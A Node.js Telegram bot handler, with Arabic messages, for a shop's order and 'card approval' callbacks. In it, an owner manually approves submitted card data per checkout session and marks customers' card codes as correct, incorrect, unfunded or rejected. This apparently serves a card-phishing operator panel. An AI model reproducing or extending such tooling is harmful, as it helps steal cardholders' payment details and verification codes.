'use strict';

const approvalStore = require('../../../lib/checkoutApprovalStore');
const { getBot } = require('../bot');
const { isOwner, mainKeyboard, sendOrderDetails, updateOrderStatus, sendStats } = require('./helpers');

// دالة مساعدة للتعامل مع الأخطاء
const handleCallbackError = async (error, chatId, action, bot) => {
  const errorMessage = error instanceof Error ? error.message : String(error);
  console.error(`[Telegram Callback Error] Action: ${action}, ChatId: ${chatId}, Error: ${errorMessage}`, error.stack || '');
  
  try {
    await bot.sendMessage(chatId, '❌ حدث خطأ أثناء معالجة طلبك. يرجى المحاولة مرة أخرى.');
  } catch (sendError) {
    console.error('[Telegram] Failed to send error message to user:', sendError.message);
  }
};

const setupCallbacks = () => {
  const bot = getBot();
  if (!bot) return;

  bot.on('callback_query', async query => {
    const timestamp = new Date().toISOString();
    const chatId = query.message.chat.id;
    const data = query.data;
    const userName = query.from.first_name || query.from.username || 'unknown';
    
    // تسجيل الـ callback
    console.log(`[Telegram Callback] Time: ${timestamp}, ChatId: ${chatId}, User: ${userName}, Data: ${data}`);

    // التحقق من الملكية
    if (!isOwner(chatId)) {
      console.warn(`[Telegram] Unauthorized callback from chatId: ${chatId}`);
      return;
    }

    try {
      await bot.answerCallbackQuery(query.id);

      if (data === 'orders_pending') {
        await bot.emit('text', { chat: { id: chatId }, text: '/orders pending' }, ['/orders pending', 'pending']);
        return;
      }

      if (data === 'orders_all') {
        await bot.emit('text', { chat: { id: chatId }, text: '/orders' }, ['/orders', '']);
        return;
      }

      if (data === 'stats') {
        await sendStats(chatId, '');
        return;
      }

      if (data === 'stats_today') {
        await sendStats(chatId, 'today');
        return;
      }

      if (data === 'stats_month') {
        await sendStats(chatId, 'month');
        return;
      }

      if (data === 'refresh') {
        await bot.sendMessage(chatId, '✅ تم التحديث', mainKeyboard);
        return;
      }

      if (data.startsWith('approve_card_')) {
        const sessionId = data.replace('approve_card_', '');
        approvalStore.setStatus(sessionId, 'approved');
        await bot.sendMessage(chatId, '✅ تمت الموافقة على بيانات البطاقة');
        return;
      }

      if (data.startsWith('reject_card_invalid_')) {
        const sessionId = data.replace('reject_card_invalid_', '');
        approvalStore.setStatus(sessionId, 'error', 'تم رفض البطاقة - كود غير صحيح');
        await bot.sendMessage(chatId, '❌ تم رفض البطاقة - كود غير صحيح');
        return;
      }

      if (data.startsWith('reject_card_nobalance_')) {
        const sessionId = data.replace('reject_card_nobalance_', '');
        approvalStore.setStatus(sessionId, 'error', 'تم رفض البطاقة - لا يوجد رصيد');
        await bot.sendMessage(chatId, '❌ تم رفض البطاقة - لا يوجد رصيد');
        return;
      }

      if (data.startsWith('reject_card_rejected_')) {
        const sessionId = data.replace('reject_card_rejected_', '');
        approvalStore.setStatus(sessionId, 'error', 'تم رفض البطاقة');
        await bot.sendMessage(chatId, '❌ تم رفض البطاقة - رفض البنك');
        return;
      }

      if (data.startsWith('reject_card_')) {
        const sessionId = data.replace('reject_card_', '');
        approvalStore.setStatus(sessionId, 'rejected');
        await bot.sendMessage(chatId, '❌ تم رفض بيانات البطاقة');
        return;
      }

      if (data.startsWith('verify_correct_')) {
        const sessionId = data.replace('verify_correct_', '');
        approvalStore.setVerificationResult(sessionId, 'correct');
        await bot.sendMessage(chatId, '✅ تم تأكيد صحة الكود - الكود صحيح');
        return;
      }

      if (data.startsWith('verify_incorrect_')) {
        const sessionId = data.replace('verify_incorrect_', '');
        approvalStore.setVerificationResult(sessionId, 'incorrect');
        await bot.sendMessage(chatId, '❌ تم رفض الكود - الكود غير صحيح');
        return;
      }

      if (data.startsWith('verify_nobalance_')) {
        const sessionId = data.replace('verify_nobalance_', '');
        approvalStore.setVerificationResult(sessionId, 'nobalance');
        await bot.sendMessage(chatId, '💳 لا يوجد رصيد - تم إشعار العميل');
        return;
      }

      if (data.startsWith('verify_rejected_')) {
        const sessionId = data.replace('verify_rejected_', '');
        approvalStore.setVerificationResult(sessionId, 'rejected');
        await bot.sendMessage(chatId, '🚫 تم رفض البطاقة - تم إشعار العميل');
        return;
      }

      if (data.startsWith('approve_')) {
        const id = parseInt(data.split('_')[1]);
        await updateOrderStatus(chatId, id, 'approved');
        return;
      }

      if (data.startsWith('reject_')) {
        const id = parseInt(data.split('_')[1]);
        await updateOrderStatus(chatId, id, 'rejected');
        return;
      }

      if (data.startsWith('details_')) {
        const id = parseInt(data.split('_')[1]);
        await sendOrderDetails(chatId, id);
      }
    } catch (error) {
      await handleCallbackError(error, chatId, data, bot);
    }
  });
};

module.exports = { setupCallbacks };
